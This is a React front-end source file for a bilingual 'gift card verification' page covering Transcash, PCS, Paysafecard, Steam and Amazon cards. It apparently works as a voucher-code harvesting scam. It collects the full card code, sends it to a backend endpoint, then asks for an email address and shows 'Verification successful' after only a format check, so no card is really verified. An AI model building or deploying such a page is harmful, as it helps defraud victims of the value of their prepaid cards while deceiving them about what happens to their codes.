import { useMemo, useState } from 'react';

const translations = {
  en: {
    title: 'Gift card verification',
    languageLabel: 'Language',
    english: 'English',
    german: 'Deutsch',
    chooseType: 'Select a gift card type',
    cardTypes: { transcash: 'Transcash', pcs: 'PCS', paysafecard: 'Paysafecard', steam: 'Steam', amazon: 'Amazon' },
    securityLabel: 'Enter the code',
    securityPlaceholder: 'Code',
    send: 'Send',
    sending: 'Sending...',
    securitySent: 'Please enter your email address.',
    securitySendFailed: 'Verification failed',
    emailLabel: 'Enter your email address',
    emailPlaceholder: 'you@example.com',
    verify: 'Verify',
    verificationSuccess: 'Verification successful',
    invalidEmail: 'Please enter a valid email address.',
    step1Hint: 'Choose a card type to start the verification process.',
    step2Hint: 'Your code must match the selected card type length.',
    emailSuccessDetail: 'Verification complete.',
  },
  de: {
    title: 'Geschenkkartenüberprüfung',
    languageLabel: 'Sprache',
    english: 'Englisch',
    german: 'Deutsch',
    chooseType: 'Wählen Sie eine Geschenkkartenart',
    cardTypes: { transcash: 'Transcash', pcs: 'PCS', paysafecard: 'Paysafecard', steam: 'Steam', amazon: 'Amazon' },
    securityLabel: 'Geben Sie den Code ein',
    securityPlaceholder: 'Code',
    send: 'Senden',
    sending: 'Wird gesendet…',
    securitySent: 'Bitte geben Sie Ihre E-Mail-Adresse ein.',
    securitySendFailed: 'Verifizierung fehlgeschlagen',
    emailLabel: 'Geben Sie Ihre E-Mail-Adresse ein',
    emailPlaceholder: 'sie@beispiel.de',
    verify: 'Überprüfen',
    verificationSuccess: 'Überprüfung erfolgreich',
    invalidEmail: 'Bitte geben Sie eine gültige E-Mail-Adresse ein.',
    step1Hint: 'Wählen Sie einen Kartentyp, um den Überprüfungsprozess zu starten.',
    step2Hint: 'Ihr Code muss zur gewählten Kartentyp-Länge passen.',
    emailSuccessDetail: 'Überprüfung abgeschlossen.',
  },
};

const cardTypeRequirements = {
  transcash: {
    label: 'Transcash',
    length: 12,
    image: new URL('../assets/Transcash.png', import.meta.url).href,
  },
  pcs: {
    label: 'PCS',
    length: 10,
    image: new URL('../assets/pcs.png', import.meta.url).href,
  },
  paysafecard: {
    label: 'Paysafecard',
    length: 16,
    image: new URL('../assets/paysafecard.png', import.meta.url).href,
  },
  steam: {
    label: 'Steam',
    length: 15,
    image: new URL('../assets/Steam.png', import.meta.url).href,
  },
  amazon: {
    label: 'Amazon',
    length: 15,
    image: new URL('../assets/amazon.png', import.meta.url).href,
  },
};

const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

const languageOptions = [
  { code: 'en', label: 'EN', flag: '🇬🇧' },
  { code: 'de', label: 'DE', flag: '🇩🇪' },
];

function App() {
  const [language, setLanguage] = useState('en');
  const [step, setStep] = useState(1);
  const [cardType, setCardType] = useState('');
  const [code, setCode] = useState('');
  const [email, setEmail] = useState('');
  const [verificationResult, setVerificationResult] = useState(null);
  const [loading, setLoading] = useState(false);
  const [emailError, setEmailError] = useState('');

  const t = useMemo(() => translations[language], [language]);
  const selectedCardType = cardType ? cardTypeRequirements[cardType] : null;
  const expectedSecurityLength = selectedCardType?.length ?? 0;

  const handleLanguageChange = (lang) => {
    setLanguage(lang);
  };

  const handleSendSecurity = async () => {
    if (!selectedCardType || code.length !== expectedSecurityLength) {
      return;
    }
    setLoading(true);

    try {
      const response = await fetch('/api/sendSecurityText', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ cardType, securityText: code }),
      });

      if (!response.ok) {
        setVerificationResult('failure');
        setStep(4);
        return;
      }

      setStep(3);
    } catch (error) {
      setVerificationResult('failure');
      setStep(4);
      console.error(error);
    } finally {
      setLoading(false);
    }
  };

  const handleVerifyEmail = () => {
    setEmailError('');
    if (!emailRegex.test(email.trim())) {
      setEmailError(t.invalidEmail);
      return;
    }
    setVerificationResult('success');
    setStep(4);
  };

  return (
    <div className="app-shell">
      <header className="app-header">
        <div>
          <h1>{t.title}</h1>
          <p>{language === 'en' ? 'Default language is English.' : 'Die Standardsprache ist Englisch.'}</p>
        </div>
        <div className="language-switcher">
          {languageOptions.map((option) => (
            <button
              key={option.code}
              className={language === option.code ? 'active' : ''}
              onClick={() => handleLanguageChange(option.code)}
            >
              {option.label} {option.flag}
            </button>
          ))}
        </div>
      </header>

      <main className="card-form">
        {step === 1 && (
          <section className="panel">
            <h2>{t.chooseType}</h2>
            <p>{t.step1Hint}</p>
            <div className="option-grid">
              {Object.entries(t.cardTypes).map(([key, label]) => {
                const card = cardTypeRequirements[key];
                return (
                  <button
                    key={key}
                    type="button"
                    className={cardType === key ? 'card-option selected' : 'card-option'}
                    onClick={() => setCardType(key)}
                    aria-label={label}
                  >
                    <img src={card.image} alt={label} />
                    <span>{label}</span>
                  </button>
                );
              })}
            </div>
            <button
              className="primary-button"
              type="button"
              disabled={!cardType}
              onClick={() => setStep(2)}
            >
              {t.send}
            </button>
          </section>
        )}

        {step === 2 && (
          <section className="panel">
            <h2>{t.securityLabel}</h2>
            <p>
              {selectedCardType
                ? `Enter the ${selectedCardType.length}-character code for ${selectedCardType.label}.`
                : t.step2Hint}
            </p>
            <input
              type="text"
              maxLength={selectedCardType?.length ?? 16}
              value={code}
              placeholder={t.securityPlaceholder}
              onChange={(event) => setCode(event.target.value)}
            />
            <div className="button-row">
              <button className="secondary-button" type="button" onClick={() => setStep(1)}>
                Back
              </button>
              <button
                className="primary-button"
                type="button"
                onClick={handleSendSecurity}
                disabled={code.length !== expectedSecurityLength || loading}
              >
                {loading ? t.sending : t.send}
              </button>
            </div>
            {/* status messages are hidden until final result */}
          </section>
        )}

        {step === 3 && (
          <section className="panel">
            <h2>{t.emailLabel}</h2>
            <input
              type="email"
              value={email}
              placeholder={t.emailPlaceholder}
              onChange={(event) => setEmail(event.target.value)}
            />
            {emailError && <p className="error-message">{emailError}</p>}
            <div className="button-row">
              <button className="secondary-button" type="button" onClick={() => setStep(2)}>
                Back
              </button>
              <button className="primary-button" type="button" onClick={handleVerifyEmail}>
                {t.verify}
              </button>
            </div>
          </section>
        )}

        {step === 4 && (
          <section className="panel final-panel">
            <div className={`result-icon ${verificationResult}`}>
              {verificationResult === 'success' ? '✓' : '✕'}
            </div>
            <h2>
              {verificationResult === 'success'
                ? t.verificationSuccess
                : t.securitySendFailed}
            </h2>
          </section>
        )}
      </main>
    </div>
  );
}

export default App;
